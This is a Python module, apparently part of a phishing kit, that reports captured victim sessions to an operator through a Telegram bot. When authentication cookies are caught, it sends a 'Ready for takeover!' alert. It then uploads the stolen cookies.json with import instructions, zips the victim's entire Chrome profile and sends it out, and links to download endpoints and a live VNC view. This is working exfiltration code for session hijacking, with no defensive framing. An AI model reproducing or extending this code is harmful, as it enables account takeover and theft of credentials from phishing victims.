#!/usr/bin/env python3
"""
Telegram Bot - Minimal, clean alerts with buttons
Only sends ONE alert when auth is captured
"""

import asyncio
import aiohttp
import json
import os
import zipfile
import tempfile
from pathlib import Path
from typing import Optional, Dict
from datetime import datetime


class TelegramBot:
    def __init__(self, bot_token: str, chat_id: str, domain: str = "localhost"):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.domain = domain
        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
        
        # Track what we've already sent - NEVER send duplicates
        self.sent_session_start: set = set()
        self.sent_auth_alert: set = set()
    
    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token and self.chat_id)
    
    async def _api(self, method: str, **kwargs) -> Optional[Dict]:
        if not self.is_configured:
            print("[TG] Not configured")
            return None
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(f"{self.base_url}/{method}", **kwargs) as r:
                    if r.status == 200:
                        return await r.json()
                    print(f"[TG] Error {r.status}: {await r.text()}")
        except Exception as e:
            print(f"[TG] Exception: {e}")
        return None
    
    async def send(self, text: str, buttons: list = None) -> bool:
        """Send message with inline keyboard"""
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if buttons:
            payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
        
        return await self._api("sendMessage", json=payload) is not None
    
    async def send_file(self, path: str, caption: str = "") -> bool:
        """Send a document"""
        if not Path(path).exists():
            return False
        
        data = aiohttp.FormData()
        data.add_field('chat_id', self.chat_id)
        data.add_field('document', open(path, 'rb'), filename=Path(path).name)
        if caption:
            data.add_field('caption', caption)
            data.add_field('parse_mode', 'HTML')
        
        return await self._api("sendDocument", data=data) is not None

    # =========================================
    # ALERTS - Each type only sends ONCE
    # =========================================
    
    async def on_session_start(self, session_id: str, target: str) -> bool:
        """Send ONCE when session starts"""
        if session_id in self.sent_session_start:
            return False
        self.sent_session_start.add(session_id)
        
        msg = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🎯 <b>NEW SESSION</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📋 <code>{session_id}</code>\n"
            f"🌐 {target}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
        )
        
        buttons = [[
            {"text": "👁 Watch Live", "url": f"http://{self.domain}:6080/vnc.html"},
            {"text": "📊 Dashboard", "url": f"http://{self.domain}"}
        ]]
        
        return await self.send(msg, buttons)
    
    async def on_auth_captured(self, session_id: str, cookies: list, total: int, loot_dir: str) -> bool:
        """Send ONCE when auth cookies captured - THE MAIN ALERT"""
        if session_id in self.sent_auth_alert:
            return False
        self.sent_auth_alert.add(session_id)
        
        # Build cookie list
        cookie_names = "\n".join([f"   • <code>{c.get('name','?')}</code>" for c in cookies[:6]])
        
        msg = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🔐 <b>SESSION CAPTURED!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📋 Session: <code>{session_id}</code>\n\n"
            f"🍪 <b>Auth Cookies:</b> {len(cookies)}\n"
            f"📦 <b>Total Cookies:</b> {total}\n\n"
            f"<b>Captured:</b>\n{cookie_names}\n\n"
            "✅ <b>Ready for takeover!</b>\n"
        )
        
        buttons = [
            [
                {"text": "📥 Get Cookies", "url": f"http://{self.domain}/api/download/{session_id}/cookies"},
                {"text": "📦 Get Profile", "url": f"http://{self.domain}/api/download/{session_id}/profile"}
            ],
            [
                {"text": "👁 Watch Session", "url": f"http://{self.domain}:6080/vnc.html"}
            ]
        ]
        
        await self.send(msg, buttons)
        
        # Send cookies file directly
        cookies_file = Path(loot_dir) / "cookies.json"
        if cookies_file.exists():
            await self.send_file(
                str(cookies_file),
                f"🍪 <b>{session_id}</b> - Import with cookie editor extension"
            )
        
        return True
    
    async def send_profile(self, session_id: str, profile_path: str) -> bool:
        """Zip and send Chrome profile"""
        profile_dir = Path(profile_path)
        if not profile_dir.exists():
            return False
        
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in profile_dir.rglob('*'):
                    if f.is_file():
                        zf.write(f, f.relative_to(profile_dir))
            
            caption = (
                f"📦 <b>Chrome Profile</b>\n\n"
                f"<code>chrome --user-data-dir=./extracted_folder</code>"
            )
            return await self.send_file(zip_path, caption)
        finally:
            Path(zip_path).unlink(missing_ok=True)


# Singleton
_bot: Optional[TelegramBot] = None

def get_bot() -> TelegramBot:
    global _bot
    if _bot is None:
        _bot = TelegramBot(
            os.environ.get("TELEGRAM_BOT_TOKEN", ""),
            os.environ.get("TELEGRAM_CHAT_ID", ""),
            os.environ.get("PHISHING_DOMAIN", "localhost")
        )
    return _bot
